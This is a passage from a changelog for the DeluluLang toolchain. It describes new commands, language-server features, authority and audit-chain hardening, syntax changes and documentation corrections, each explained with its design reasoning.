  prevent. Without the rule it was observed adding `{Write}` on its own, on both the human and the
  JSON surface. The rule is the same one `delulu fix` follows for authority-widening repairs.

  The pin is the dependency's authority and nothing more — the tempting shortcut is a permissive
  pin that makes the first `check` pass, which would never be tightened and would leave
  `authority --diff` nothing to notice when the dependency later grew. An existing pin is never
  rewritten (that line is the one a reviewer reads), and a dependency that does not check clean is
  refused rather than pinned at a value nobody can verify.

- **A diagnostic code you cannot look up now has an answer instead of a dead end.** Sixteen
  `DLxxxx` were named across this repository — in specifications, in build orders, in the registry's
  own comments — that `REGISTRY` does not allocate. `delulu explain` answered `unknown code` for
  every one of them, which is exactly what it answers for a typo. For the population this language
  is built for, "I cannot tell you" and "that was withdrawn, here is why" are not the same answer,
  and only one of them means the reader made a mistake.

  A new `UNALLOCATED` table beside the registry gives each one a **disposition** and a reason:
  `retired` (withdrawn; the rule it named does not exist), `never-allocated` (a number the ranges
  skip on purpose), `reserved` (held open so the next code need not move), `specified-not-implemented`,
  and `sentinel`. `delulu explain` answers from it, `docs/reference/diagnostics.md` gained a
  generated "Codes this compiler cannot emit" chapter, and the Survey subtracts it — that finding
  is now closed rather than merely explained.

  **Two of the sixteen are a real gap, and are recorded as one rather than tidied away.** Stage 2's
  rule VIS-1 says referencing a non-visible item is `DL1012` and Stage 3 tabulates `DL1203` for an
  artifact hash/receipt conflict; neither code exists and nothing raises them. Closing that by
  inventing the codes, or by editing the specifications to match the implementation, would have
  been the easy move and the wrong one.

  `sentinel` exists because `DL9999` has two jobs that both depend on it staying unrecognised — the
  registry guard asserts its absence, and `cli_contract` feeds it to `explain` to prove refusal
  works. It is recorded so the Survey stops calling it unexplained, and deliberately left
  *unexplainable*. A test holds both halves.

  A guard test asserts no code is in both tables: codes are never reused, and without it a future
  reissue would turn this table into a lie that `explain` then repeats. Observed failing.

  The Survey also stopped misreading `DLxxxx–DLyyyy` **range notation** as two citations — prose
  reserving a block for a later stage was being read as claiming both endpoints exist.

- **`delulu completions <bash|zsh|fish|powershell>` — generated, not maintained.** A completion
  script is a *copy* of the command list, and this repository has already paid for that kind of
  copy once: `deploy` and `fleet` were working commands that `--help` never mentioned, which is how
  they escaped the first `--json` contract sweep entirely.

  So the list comes from one constant, and **a test binds that constant to the dispatcher and to
  the help text** — all three must name the same commands or the build fails saying which is
  missing. Dropping one entry was observed failing exactly that way. The internal foreign-worker
  subcommand stays unadvertised; it is spawned by the host, never typed.

  That test immediately found a real wart: `verify-sig` was documented on a line shared with
  `sign`, so `delulu verify-sig --help` printed the *entire* manual instead of its own usage. It
  has its own line now and its own focused help.

  No descriptions in the scripts, deliberately — thirty-one sentences restating `usage()` is
  precisely the second copy this design exists to avoid. There is no `--json` form either, because
  the output is a shell script and pretending otherwise would emit something no shell can source.
  The bash and PowerShell scripts were verified by loading them into a real shell and completing
  against them, not by inspection.

- **`delulu doctor` says whose repository it means.** Outside DeluluLang's own source tree it noted
  that "repository checks" were skipped, which a user with a Delulu project of their own could read
  as a remark about *theirs*. It now says the checks do not apply there and that nothing about your
  project is being skipped. The command stays one command on purpose: the environment section is
  for anyone who uses Delulu, the repository section for someone working on the language, and it is
  one question whose answer has more to say in one place than the other — splitting it would either
  duplicate the environment checks or oblige a contributor to remember two commands, forgetting the
  one that rots.

- **`delulu new` — a package that already checks, tests and runs.** Until now the answer to "I
  built the compiler, now what?" was to hand-write `delulu.toml` and infer the layout from an
  example, which is a poor first five minutes for a language whose proposition has to be understood
  before anything else makes sense.

  **The scaffold is a teaching artifact, and its authority is the lesson.** The generated package
  declares a ceiling equal to *exactly* what its code does — one effect for a binary, none at all
  for a library — because tightening that line is the habit worth forming on day one. A template
  shipping `effects = ["Read", "Write", "Net"]` "to save you time" would teach the opposite of the
  thing being taught, once per project, forever, so the minimal ceiling is pinned by a test rather
  than merely produced. There is no `[test-authority]` table either, and the generated test needs
  none: an absent table grants nothing (invariant 41).

  Running it, then leaving off `--grant console`, produces DL0703 at the exact line — the whole
  idea, demonstrated in the first thirty seconds.

  Two defects were found by testing rather than by reading. **Every command the printed next-steps
  names is now executed by a test, and every command executed must appear in the message** — a
  binding that immediately caught the first draft telling people to run `delulu test`, which
  refuses without a `./tests` directory. And the name check initially used only
  `token::is_reserved`, which covers words reserved for *future* use; `fn` sailed through and would
  have produced a brand-new package containing `module fn`, which does not parse. Both keyword
  tables are consulted now, `MORPHABLE_KEYWORDS` being the lexer's active set.

  It refuses a name that could not be a module name (suggesting `my_app` for `my-app`), and never
  writes into a directory that already holds something.

- **`delulu fix` — apply the repairs the checker already computed.** The repairs have carried
  byte-precise edits since Stage 1 and `delulu check --json` has always reported them, but applying
  them without an editor meant re-implementing the byte splicing by hand — which is how a
  machine-readable contract stops being followed. Nothing here invents a repair.

  **What it refuses to do is the point**, and the policy is the one `Confidence` already documents:
  an `Exact` repair is safe to apply blindly *unless* flagged `authority_widening` or
  `requires_human`.

  - **A repair that would widen what your program may do is never applied on its own.** You may
    accept one, but you must name it — `--accept-widening <repair-id>`. There is deliberately **no
    flag that accepts all of them**: on a batch command that means "widen authority everywhere,
    unattended", and that flag ends up in a CI script. Without this rule the command was observed
    adding `! {Write}` to a function's row by itself, which is the exact guarantee the language
    exists to sell.
  - **A file stored in a surface morph is refused, intact.** Such a file is translated to canonical
    DeluluLang before it is analysed, so the repaired result is canonical too — writing it back
    replaces *every keyword the author wrote* with its canonical spelling while leaving the
    `//! morph:` pragma still claiming their surface. Observed rather than deduced: with the guard
    removed, a `zh-CN-keywords` file asked to rename one identifier came back entirely in English,
    and `delulu check` then called it clean, so nothing downstream would have reported the loss.
    The refusal prints the three-command way through — translate, fix, translate back — and that
    path is itself tested, because a workaround nobody has run is a suggestion, not a remedy.
  - **Edits are applied back to front**, the rule `docs/for-agents.md` has always stated. With an
    ascending sort, two identifier renames one line apart produced `consume_e` and swallowed a
    space — and the file still parsed, which is what makes that class of bug expensive later.
  - A repair whose bytes collide with one already applied is skipped and said so; a repair that
    would break parsing means **nothing is written at all**. That guard is deliberately not "the
    error count must not rise" — fixing a parse error legitimately reveals the type errors it was
    masking, and a guard that punished that would block the most useful fixes there are.

  `--dry-run` writes nothing, `--json` emits one envelope carrying a `verdict` for **every** repair
  including the skipped ones — an agent that cannot see a refused repair concludes there was
  nothing to do.

- **Signature help, carrying the authority row.** Writing a call now shows what it takes and
  **what it is allowed to do**, with the argument you are on highlighted — `authority: {Write}`
  before you commit to the call rather than after. That line is the part no other language's
  signature help is able to offer.

  The label is **sliced from the declaring file's own source** rather than re-rendered from the
  type, so you see the signature exactly as its author wrote it — reference capabilities,
  generics, row and all — and a renderer that drifts from the language cannot exist here, because
  there is no renderer. Parameter highlights are UTF-16 offsets into that label, so a client
  selects the exact characters instead of guessing by substring when two parameters read alike.

  Unlike completion, trigger characters *are* advertised (`(` and `,`): those are the two places a
  signature becomes relevant and there is a real one to show at both. A trigger is a promise, and
  this one can be kept. Actor behaviours get signature help too — a `fn` and a `be` are different
  declarations to the parser and the same thing at a call site.

- **Definition and references now reach the whole project**, not only what is open — jumping to a
  declaration in a file you have not opened yet is the normal case, and it previously returned
  nothing at all.

  **Rename deliberately does not follow.** It edits the documents you have open and *refuses* when
  that would leave the name behind elsewhere, naming the files to open first. The reference walk is
  an approximation — it matches a qualified path's final segment, so an unrelated record method of
  the same name is included, which `name_occurrences` has always said openly. Across three files
  you have open, an approximate rename is a diff you can read and correct; across five hundred you
  have not, it is silent corruption at scale. Without the refusal the rename was observed
  completing on the declaration alone and leaving a second file calling a function that no longer
  existed. **The server reads the whole project and writes only what you can see** — the same rule
  as the existing local-name refusal, one level up.

- **Workspace symbols — the language server can now answer questions about files nobody opened.**
  `workspace/symbol` returns every module-level declaration in the project, so "where is this
  declared?" stops requiring that you already found the file. Previously the server knew only about
  open buffers, which is a poor bargain for a human and a useless one for an agent that has opened
  nothing: it got an empty list with no way to distinguish that from "it does not exist".

  The index **parses rather than type-checks**, because names and spans are all it needs and
  parsing is a fraction of the cost — indexing a repository is not the moment to run the whole
  checker over every file in it. It is validated against file modification times rather than
  against `didChangeWatchedFiles`, which only arrives if the client was configured to send it; an
  index that rots whenever the editor is not paying attention is worse than none, because it
  answers confidently. `target/`, `.git/` and their kind are skipped, the walk is capped, and with
  no workspace folder nothing is read from disk at all.

  **An open buffer always wins over its copy on disk** — what you are looking at may not be saved,
  and the saved version is not what you would be navigating to. Both of those were observed
  failing before the rules that fix them: a `target/` copy of a function surfacing in results, and
  a stale on-disk name reported alongside the unsaved buffer that replaced it.

  The `file:` URI parser is hand-rolled, since this server takes no new dependencies. Its own unit
  test immediately caught the first version rejecting `file:/path` — the minimal form RFC 8089
  allows — which would have meant a workspace root that silently failed to register and an index
  that stayed permanently empty.

- **Completion in the language server.** Typing now offers the declarations in scope — a function
  carrying its signature **and its authority row**, so you see what it can do before you call it —
  followed by the keywords, with names from the file you are in sorted above names from other open
  files.

  **Inside an effect row `! { … }`, only effects are offered.** Nothing else is legal there, and a
  completion list is the most-read documentation a language has: it is consulted on every keystroke
  by people who have not read the spec. Suggesting a keyword where a keyword cannot compile teaches
  the language wrongly, at the worst possible moment.

  Every list is the compiler's own — keywords from `MORPHABLE_KEYWORDS`, effects from
  `CORE_EFFECT_NAMES`, declarations from the checked module. Nothing is restated, so the completion
  list cannot drift from the language the way the effect-list error message had. No trigger
  characters are advertised: naming `.` or `{` would promise member and block completion the server
  does not have, and a list that appears with nothing useful to say trains people to dismiss it.

- **`delulu doctor` — one command for "is this checkout healthy?"** It checks the environment
  (version, embedded Python, state directory and its writability, broker mode, and it *verifies the
  audit chain* rather than assuming it) and then, **only when standing inside the DeluluLang source
  tree**, checks the repository map: regenerates it if it is behind, then runs the map's own
  integrity checks — every edge cites a line, nothing dangles, the totals agree with the contents.
  Elsewhere it says the repository section was skipped instead of reporting on a checkout it is not
  in. `--json` emits one envelope; `--check` never writes.

  **It writes nothing when the map is already current**, so running it is not a change to the
  repository — and when it does write, each file goes through a temporary file and a rename.
  That is not tidiness: doctor is short-lived, runs where the map lives, and the suite runs it
  alongside tests that read those files. A short-lived process writing a shared artifact is exactly
  how campaign finding C69 corrupted an audit chain, and the shape is designed out here rather than
  hoped away. For the same reason no test runs doctor in writing mode against a stale tree: it
  would silently repair the very staleness the freshness gate exists to fail on.

- **The Survey — a map of this repository, generated from this repository.** `docs/survey/` now
  holds the shape of the project as a graph: which crates depend on which, what each module is,
  which file raises which diagnostic code, and which ruling authorized which line. 904 nodes and
  7,996 edges, in three channels — `SURVEY.md` for people, `survey.json` (schema `survey/1`) for
  tools, `DISCREPANCIES.md` for whatever the repository currently gets wrong about itself.

  **Every edge names the file and line it was read from, and nothing is inferred from name
  similarity or proximity.** A graph that guesses gets more impressive as it gets less true, and
  you cannot tell a real edge from a confident one; this map cannot state a relation it cannot
  cite. Where it is unsure it files a discrepancy rather than drawing a fainter line. Extraction is
  lexical, so nothing it reads is trusted alone: a `use` is checked against the crate's manifest, a
  `mod` against the filesystem, a `DLxxxx` against the registry, a quoted count against a recount
  of the tree — and **disagreement is reported, never resolved by picking a winner**.

  It cannot rot. `cargo test --workspace` rebuilds the map and fails if the committed copy is
  behind, naming the first line that differs; five further tests hold it to its own standard,
  including that two builds of the same tree agree. `delulu-survey` depends on no other crate in
  the workspace, deliberately: a map you cannot open while the thing it maps is broken is a map you
  cannot use to fix it. Not to be confused with the **Atlas** (`crates/delulu-atlas`), which maps a
  checked Delulu *program* from compiler facts — the Survey maps the repository that implements it.

  The first run found five things wrong in the repository (all corrected below) and, more usefully,
  five things wrong with itself. Both are recorded in `docs/survey/AUDIT.md`, including the one
  where this audit stated a finding more confidently than it had checked.

- **`parse_float(s) -> Option[Float]`.** DeluluLang had `parse_int` and no way at all to read a
  `Float` out of text — a program could not read a temperature from a file. Found by writing the
  multi-package corpus, which is what a corpus is for.

  It asks **the same function the lexer asks**. Written separately, the obvious implementation would
  have been `s.trim().parse::<f64>().ok()`, which answers `Some(inf)` for `1.0e400` and for the *word*
  `inf` — a data file could then put infinity into a program whose source is forbidden to write it,
  and the language would have had two float rules wearing one name. Additive: no existing program
  changes meaning, and the WASM backend refuses it with the DL1201 it already gives `parse_int`. (D54)

- **The capability corpus has a multi-package tier, and three of its programs are RUN.** `tests/corpus/`
  held seven programs and the tier for multi-module programs held a note and no program. Tier 4 is now
  **four packages, seven modules, dependency depth three, with a diamond**, exercising what only
  appears above single-file size: authority declared per package and joined across the graph, a ceiling
  stated by the consumer rather than claimed by the dependency, and a type that crosses every boundary
  while carrying none. The conformance harness learned the difference between a file and a package, and
  `corpus_cli.rs` asserts the *output* of three programs — because checking clean and working are
  different claims.

  Writing it found four defects, which is the argument for having written it: no `parse_float` (above);
  a public signature may name a type its package does not re-export, and the failure lands on the
  consumer with the error reported inside the dependency's own source (C58); **a multi-package program
  cannot be run at all** — `kind = "bin"` is declarable and unexecutable, true of the shipped
  `examples/greeter/` too (C59); and `let _ = expr` is refused although `_` is a valid match pattern
  (C61). All three are recorded open rather than papered over, and the corpus tier's README says which
  of its claims are compile-time only. (C7, ruling D55)

- **The authority report says when a credential can leave.** A new gated `exposure:` line joins facts
  the report already carried — `Declassify` in the effect row, the secret names, and the reachable
  egress (foreign code, network, files) — into the sentence a human needs *before* deciding whether to
  grant `--grant declassify`. It reports capability, never behaviour, and names the safe case too. No
  authority semantics changed and `--json` is unchanged, because agents could already derive it.
  (C25, ruling D32)
- **A lease token for a dead grant no longer redeems.** `redeem` verified the token's MAC, that the
  bound node existed, and the token's own expiry — never whether the node was *alive*. A token for a
  revoked node redeemed successfully, as did one under a revoked or expired ancestor. Enforcement
  refused the grant afterwards so nothing was authorized, but the redemption wrote an audit record
  reading `decision: "allow"` for a grant an operator had explicitly killed, and stamped the redeemer's
  own text onto the revoked node. (C29, ruling D36)
- **The audit read path no longer presents a broken chain as authentic.** `audit verify` checked every
  hash and link; `audit tail`/`query` checked none. Flipping one record's `decision` displayed the
  forged value with no warning, and corrupting one record into non-JSON made it **vanish from the
  listing** — no gap marker, no error. Reads now verify first, still show the records (an operator
  investigating a tampered log is who most needs to read them), warn that they must not be trusted, and
  exit nonzero; `--json` always carries `chain_verified`. (C30, ruling D36)
- **Delulu Guard gains a `device` class.** `Scopes` has eight dimensions and the Guard enumerated
  seven, because `device` arrived later (RFC 0001 F1) and neither the fixed seven-element mint array
  nor the `_ => None` op map grew with it — neither could fail to compile. Actuation was still gated
  all-or-nothing via `effect:Actuate`, but `device` was the only authority axis with no per-item rules:
  you could not seal a thruster while leaving a status LED at `warn`. Now `device:sat0/thruster →
  sealed` works, with no default rule added (the tier physical actuation deserves is an operator's
  call). `use_axis_class` is exhaustive, so the next op cannot be born ungated in silence.
  (C31, ruling D37)
- **Surface-syntax morphs — write DeluluLang's keywords in your own language, or an AI's.**
  `delulu morph list | info | check | render`, a `//! morph: <id>` file pragma read by `check`, `run`,
  `authority`, and `fmt`, and two working morphs: `morphs/zh-CN-keywords.toml` and
  `morphs/compact-ai.toml`. A program whose keywords are `函数`/`令`/`如果` is the *same program* — same
  AST, same authority, byte-identical reports — because conversion happens at exactly two edges and
  everything downstream sees canonical. Chinese, emoji, Cyrillic, Greek, and mixed-script surfaces all
  round-trip byte-identically. Identifiers, string literals, and comments are never morphed.

  Refusals: **DL1710** (not bijective), **DL1711** (an alias is another keyword's canonical spelling),
  **DL1712** (alias is not one token, including bidi controls), **DL1713** (not a renameable keyword),
  **DL1714** (morph not installed — never a silent fallback). DL1711 did not exist in the spec's law:
  `let = "fn"` satisfied every stated rule while producing a file where the word `fn` means `let`, and
  a surface that lies to a reviewer is the same class of attack as a bidi control.

  No token-savings number is claimed for the compact profile — savings are tokenizer-specific, so
  measure with your own before adopting it. Not built, and listed in the spec header rather than
  implied: plugin-delivered morphs, per-reader LSP view morphs, and morph-aware *package* builds (a
  package's `src/` must be canonical). (C22, ruling D35)
- **Licensing, and the terms of use.** `LICENSE` (Apache-2.0), `NOTICE`, `TRADEMARK.md`, and
  `GOVERNANCE.md`. Until this landed, default copyright meant nobody could legally use DeluluLang at
  all. Derivatives must use a different name; Jesse Sunil is the original creator. (C9, ruling D27)
- **A gate that runs the Book's samples.** The sample gate checked and never *ran*, which is how a
  named function used as a value (`apply(double, 21)`) type-checked and then faulted at run time.
  (C13, ruling D25)

### Changed

- **The language server accepts incremental edits** (`textDocumentSync: 2`): a keystroke sends the
  range it touched instead of the whole file. A change carrying no range still replaces the
  document outright, so every full-sync client keeps working untouched and a client that loses
  track can resynchronise by sending one.

  Applying ranges is where servers quietly corrupt their copy of a file, so the test does not
  check the edits individually — it applies a sequence and requires the server to say the same
  things about the result as about a second document opened with that text in one go. The first
  version of that test **passed against a deliberately byte-indexed implementation**: it put the
  multi-byte character in a comment, and `// λ ok` and `//  okλ` have the same start and the same
  UTF-16 length, so every derived artifact matched while the two documents differed. The edits now
  land in a test block's name, which `documentSymbol` echoes verbatim — `test "ABCDλ"` where
  `test "λABCD"` was meant is caught, and the same ranges that hid it are still reported.

  Malformed ranges are normalised rather than trusted. An inverted range used to kill the process
  outright — observed as the client seeing the server hang up mid-session — and a language server
  that dies on one bad message takes the whole editing session with it.

- **The language server checks a document once per edit, not once per question.** Every provider
  used to call `check_source` itself, so a `references` request across four open documents ran four
  full type-checks, the `rename` that followed ran eight more, and the next keystroke started over.
  Measured on the suite's own fixture: ten read-only requests over four documents cost **962 ms
  against a 30 ms single-edit baseline — 32× — and now cost a fraction of one.**

  The analysis lives **inside the document record**, not in a cache beside it. That is the whole
  design: a side cache has to be kept in step with the documents by hand, and the first draft —
  keyed by a per-document version counter — had exactly the bug that shape invites. The counter
  restarted at 1 when a document closed, so reopening a file that had changed on disk in between
  matched the entry belonging to its *previous* incarnation and served an analysis of text that no
  longer existed. Both failure directions are now fenced by tests that were observed to fail
  against the code they describe. The compiler remains the sole source of truth; only how often it
  is asked changed, never what it answers.

- **A numeric literal that is not the value you wrote is refused, in both columns.** The lexer has
  always rejected an integer literal too large for `Int` — "no automatic promotion, because a silent
  widening is a silent change of meaning" — and accepted `1.0e400`, which becomes `inf`. Same defect,
  opposite answers, twelve lines apart. `f64::from_str` does not fail on a magnitude it cannot hold: it
  saturates to infinity **and flushes to zero**, and the underflow half is the worse one — where `inf`
  announces itself downstream, a silently-zeroed gain makes a control law quietly do nothing while
  every value on the way looks ordinary.

  Both are now **DL0104**. A literal written as zero is still zero (`0.0e-400` is accepted) and a
  **subnormal is accepted** — it loses precision but keeps its magnitude, which is what the rule is
  about. Infinity remains reachable by computing it (`1.0 / 0.0`); it just cannot be spelled as a
  finite number. **This rejects programs that previously compiled**, which is why it is a change and
  not a fix. (C17, ruling D54)

- **`type Meters = Int` is now an alias, not a one-variant sum.** The right-hand side of `type X = …`
  was read as a sum whenever it was a bare identifier, which declared a *constructor* named `Int` —
  so `fn g() -> Meters { Int }` type-checked — and meant **no alias to a bare type name could be
  written at all** (`type Meters = (Int)`, parenthesised, was the only spelling that reached the alias
  production). A variant list is now signalled syntactically and only by `(` or `|`: `type E = A | B`
  and `type P = Data(Int)` are sums, a single field-less variant is `type U = Nothing()`, and
  everything else is an alias. The rule does not consult name resolution, so the grammar stays
  context-free. No program in this repository changes meaning. (C28, ruling D46a)

  **Compatibility:** a `type E = A` intended as a one-variant sum now declares an alias to a type
  named `A`, and errors if no such type exists. Write `type E = A()`.
- **A multi-line list no longer needs a trailing comma.** All four spellings now parse — one line or
  many, trailing comma or not — in every bracketed list: record type bodies, record literals,
  parameter lists, argument lists, list literals, generics, generic arguments and variant fields.
  This was never a design decision: a newline inserts a statement terminator only after a token that
  can end a statement, and a comma cannot, so `a,\n)` always parsed while `a\n)` did not — one
  terminator, unskipped before the closing bracket. `match` arms already accepted both forms, so this
  also removes an inconsistency between one list and every other. (C47b, ruling D46d)
- **A compute grant now survives crossing into an actor.** A `Root` slice silently lost its
  `computes` at an actor boundary while `actuators` and `sensors` crossed — an omission from phase
  10h rather than a safety position, since actuation moves physical machines and the compute envelope
  bounds its holder exactly as an actuator envelope does. Every `Root` authority dimension now
  crosses. (C35, ruling D46b)
- **The normative grammar now describes the language the toolchain actually implements.** Every
  comma-separated bracketed list requires a trailing comma when it spans lines (`match` arms
  excepted), and §3 of the Stage-1 specification said the opposite in both directions at once: it
  marked the comma optional where the parser demands it, and omitted it entirely from parameter lists,
  call arguments, record literals and list literals — which the parser accepts and which **`delulu
  fmt` emits**. An independent implementation written from the specification would have rejected every
  formatted file containing a wide list. The newline rule is now stated normatively, since an EBNF
  with no `NEWLINE` terminal cannot express it. Whether the parser *should* require that comma is a
  language-surface question and is left open. (C47, ruling D44a)
- **Checking a record-heavy program is no longer quadratic.** A function reading N fields of an
  N-field record deep-copied the whole type definition once per access — N² field-entry clones. One
  2000-field record took **632 ms** to check, against 173 ms for a 40,046-line file five times its
  size. Now ~42 ms, a 15× improvement, with the remaining O(fields × accesses) scan published with its
  measured curve rather than left to be discovered. (C48, ruling D44b)
- **An approved `deploy plan` now states which authority dimensions it compared.** The verdict said
  `approved — N service(s) within <env>'s authority ceiling` and `--json` said `"approved": true`, while
  the command compares the **effect** ceiling and nothing else — one authority dimension of nine, a
  scope recorded honestly in the source since the command shipped but absent from the verdict a reader
  acts on. Now `EFFECT ceiling`, with `compared` / `not_compared` on both the human and `--json`
  surfaces so an agent is told what a human is told. The verdict remains the last human line. (C45,
  ruling D43g)
- **Both engines now report the same fault.** Divide-by-zero was `DL0902` on the interpreter and a
  generic `DL0904` on the WASM backend; overflow likewise; and a deep recursion printed **16,326
  lines** of guest backtrace instead of one `DL0905`. The differential fuzz harness had been blind to
  all of it, because it counts any `(Err, Err)` pair as agreement without comparing the faults. Stage
  3's invariant 15 is also reworded to what is true and testable — identical stdout, exit codes, and
  fault *codes*, never byte-identical stderr — with the one residual divergence named rather than
  hidden. (C20, ruling D29)
- **A foreign signature's alias refusal now teaches.** `type Meters = (Int)` in a `foreign` block is
  still refused, deliberately: both engines share one lowering that matches signature types by name
  and cannot see module aliases, so expanding aliases in the checker alone would be an ABI confusion
  waiting to happen. The message now names the target and offers the exact edit; an alias expanding to
  a function type is reclassified to **DL1302** (rule R-6a). (C24, ruling D31)

### Fixed

- **"Go to definition" could land in a different file after a server restart.** The search for a
  name across open documents iterated a `HashMap` and took the first match. `HashMap` ordering
  varies between processes, so with five open files declaring the same name the answer was
  whichever one the hash seed happened to yield — observed returning `d.delulu` where it must
  return `a.delulu`. An answer a tool depends on must not depend on a hash seed, least of all for
  the population this language is aimed at, which cannot notice that yesterday's answer differs
  from today's. The order is now: **this document first, then sorted by URI.** The first half is a
  correctness improvement in its own right — a name your own file declares should resolve to your
  own file, not to an identically named one somewhere else.

- **A security-relevant version pin rested on a premise that had stopped being true.** The exact
  pins on the two post-quantum crates (`=0.1.1`, `=0.3.2`) were justified in
  `crates/delulu-runtime/Cargo.toml` by "`Cargo.lock` is gitignored in this repo" — but the
  lockfile has been tracked since D19c, and `.gitignore` says so explicitly. A live comment and a
  live ignore-file contradicted each other, and the wrong one was the one governing how an
  unaudited lattice implementation is allowed to change. The pins stand, for a reason that outlived
  the one originally given: a lockfile binds *this* build, while a `=` requirement binds every
  consumer and survives `cargo update`. Found by the Survey.

- **Numbers on the front door had drifted 14%, and the repository's own map showed five of twelve
  crates.** `README.md` and `HARDENING_CAMPAIGN.md` both claimed ~82,000 lines of Rust across 175
  files (actually ~94,000 across 194), and `README.md` reported a suite that had grown from 1,190
  tests to 1,361. Separately, `docs/REPOSITORY_STRUCTURE.md` §2 drew the Stage-1 five-crate spine
  under the heading "Crate dependency graph" — `delulu-broker`, `delulu-atlas`, `delulu-wasm` and
  the rest appeared nowhere. The C5 re-synchronization had re-checked §1 against the tree and left
  §2 alone, which is how a map rots: in the section nobody re-reads. Sizes are now recounted from
  the tree on every build and §2 points at the generated graph. Also corrected: `docs/for-agents.md`
  advertised `"delulu_version": "0.1.0"` on the page that calls itself part of the stability
  contract, while the CLI emits `1.0.0`.

- **A package whose public signature named a type it did not re-export blamed the wrong file, in the
  wrong package, for the wrong reason.** It built clean on its own; consuming it produced **25 errors
  at 14 locations**, most of them inside the *dependency's* source insisting a type was "not a type"
  in a file where that type is plainly in scope. Nothing anywhere said what was actually wrong.

  A signature is lowered in the scope of whoever **imports** it, so those reports are now collapsed
  into one diagnostic at the import that brought the signature in, naming the missing types, the
  module that declares them, and both ends it can be fixed from. In a module's own file the error
  stays exactly where it is and only gains the answer. A plain misspelling gains nothing, because it
  has no true advice to add — a diagnostic that is confident and wrong is worse than one that is
  terse. Duplicates are gone too: a diamond used to report the same sentence about the same span up
  to four times. 25 errors became 15, and a test applies the printed advice and requires the result
  to build clean.

  The tempting fix — Rust's private-in-public rule, refusing the `pub fn` where it is written — was
  measured against the shipped corpus and **rejected**: three tier-4 modules legitimately name a type
  behind a plain `import`, and that rule would have outlawed the diamond the tier exists to
  demonstrate. The rule was never wrong; only the report was. (D65, closing C58)

- **Every diagnostic that mentioned one of your types printed a number instead of its name.**
  `expected T11, found T12`, where the truth was `Verdict` versus `Status`. `Record` and `Sum` store
  an index into the declaration table, and the printer had no table — so the message named the shape
  of a disagreement and hid its content. It was not a corner case: it was every user-declared type,
  in every message, plus three surfaces nobody had connected to it — the **LSP hover**, the **REPL**,
  and **`interface.json`**, the machine-readable artifact whose whole purpose is letting an agent
  introspect a dependency without reading its source, and which published `"type": "fn(T9) -> Float"`.

  `Display for Type` is **deleted** rather than repaired: rendering a type now requires supplying the
  names, so no site can omit them by forgetting — that is what surfaced all 22 sites, three of which
  nobody would have gone looking for. Where no table exists (the plugin loader reports on types
  recovered from a DIR) a type renders `<type #11>` — not better information, but honest, because
  `T11` is spellable by an author and reads as an answer. `api_row_hash` is computed from the AST, so
  the corrected `interface.json` left every hash byte-identical and no lockfile moved.

  Recorded rather than quietly fixed: the ledger had carried this as **"does not reproduce"**. It
  reproduced on the first try. The re-test that cleared it had used `Int` and `Str` — the two shapes
  that print themselves and so could never have failed. (D64, closing C12)

- **`delulu authority` could not read a `.dwx` — the format you actually ship.** The artifact carries
  its own authority manifest, and `delulu run` reads it, verifies it and announces the effects.
  `delulu authority` on the same file fell through to the source loader and printed `stream did not
  contain valid UTF-8`; so did `check`, `why` and `atlas`. The manifest was always there — nothing
  asked it.

  `authority <file>.dwx` now reports it through the **same** `read_and_verify` the runner uses, so the
  review surface cannot vouch for bytes the runtime would refuse (a witness flips one byte and requires
  DL1202 from both). The report is labelled a compiled artifact and states what it therefore cannot
  tell you — no per-function purity, no `why` chain, because those need source. `check`/`why`/`atlas`
  now name what the file is and point at the two commands that can read it, detecting it by content
  (`\0asm`) rather than extension. And `delulu fmt notes.txt` no longer reports "reformatted 0 file(s)"
  and exits 0 on a file it silently ignored. (C65, C66, ruling D59)

- **The authority report was unreadable on a large program, and the Book's example gate counted instead
  of compiling.** On a 24,630-line program the report correctly proved **2,536 of 2,539 functions pure**
  and then printed all 2,536 names on one line of 28,242 characters, burying the six lines a reviewer
  opened it for. D38 had already ruled this shape for diagnostics — bounded for the human, complete for
  the machine — and the review surface never got it. Now 40 names plus the count, 912 bytes, with
  `--json` unchanged and complete.

  Separately, `every_book_code_block_has_a_checked_sample` asserted that the *number* of code blocks
  equals the number of sample files and never compared their contents: 0 of 10 blocks were slices of any
  sample. The consequence was in the worst chapter for it — 14, "Real adoption means calling C and
  Python" — which taught `root.foreign[mathlib](root.foreign_load())?`. That does not compile: `Root`
  has no field `foreign`, and the lib type is inferred from an annotated parameter because the grammar
  has no method type-argument syntax. The sample backing it held only the `foreign` declaration, with no
  call site. The chapter's block is now a literal slice of a sample that compiles on every run and was
  executed against the real Windows C runtime, and a correspondence gate holds it there. (C67, C68,
  ruling D60)

- **The Book credited two-engine parity to a fuzzer that cannot run the second engine, at 25× the
  real number.** Chapter 9 said parity was "enforced by a differential fuzzer running tens of
  thousands of programs on both engines" and that "two independent implementations agree on 50,000
  random programs". The generative two-engine sweep runs **2,000** programs, all inside the WASM
  fragment, and `delulu-fuzz` — the crate actually named the differential fuzz harness — depends on
  `delulu-check` and `delulu-runtime` and cannot run the WASM backend at all.

  The chapter also never said the WASM backend is a **fragment**. It is, deliberately and safely:
  outside it a program is refused as **DL1201** and falls back to the interpreter rather than
  miscompiling, and `STAGE3_SPECIFICATION.md` has always said so. Measured, **6 of 19 entry-point
  programs** in the corpus and examples compile to WASM — `.len`, `.trim`, `.split`, `.narrow`,
  `.fs_write`, embedded Python and non-`Int` actor state are all DL1201, so **none of the Book's own
  guide chapters build to a `.dwx`**. If you are writing ordinary DeluluLang you are on the
  interpreter, and the chapter now says that in those words.

  What `delulu-fuzz` does prove is stronger than the claim it was attached to: for every accepted
  program, the observed runtime effects are a subset of the effect row the checker computed for
  `main` — the executable Effect-Soundness theorem. The better evidence had been credited to the
  weaker claim. Two gates now hold the prose to the code: one reads the parity harness's loop bound
  and requires the Book to match it, one asserts `delulu-fuzz`'s dependency list. (C63, ruling D58)

- **The interpreter's recursion bound is now part of the API, so embedding is a contract rather than a
  trap.** `delulu-runtime` capped recursion at 10,000 calls and reported DL0905 — but only if the native
  stack outlasted the bound. The `delulu` CLI reserves 512 MiB for exactly that reason; an embedder got
  no such thread, so on Rust's ~2 MiB default the guard was never reached and the process died of a
  stack overflow instead. `Interp::with_max_depth` lets an embedder pick a bound their stack can hold,
  and `DEFAULT_MAX_DEPTH` / `STACK_BYTES_PER_DEPTH` publish the relationship. The default is unchanged.

  The per-frame cost was measured rather than assumed: **80 KiB of native stack per unit of depth in a
  debug build** (16 KiB and 40 KiB both overflow). The previously recorded figure — "10,000 frames need
  more than 16 MiB" — is true but roughly an order of magnitude below the real cost, and taking it
  literally would have advised an embedder into the crash this contract prevents. (C21, ruling D51)
